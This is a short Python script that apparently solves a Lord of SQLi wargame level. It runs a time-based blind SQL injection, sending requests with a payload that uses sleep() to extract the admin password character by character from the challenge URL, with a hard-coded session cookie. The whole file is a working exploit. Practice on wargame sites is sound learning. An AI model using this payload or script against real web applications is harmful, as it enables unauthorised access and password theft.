import requests
import string

session = requests.Session()

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw=' or id='admin' and if((ord(substr(pw,{},1))={}),sleep(5),null);%23"
cookies = {"PHPSESSID": "tqlf4m3teeel2nlo0lv61671fc"}
pw=''
for j in range(1,8):
    for i in string.printable:
        r = requests.get(url.format(j,ord(i)), cookies=cookies)
        print(r.elapsed.total_seconds())
        if(r.elapsed.total_seconds()>5):
            pw += i
            print("Password :", pw)
            break
print("Password :", pw)
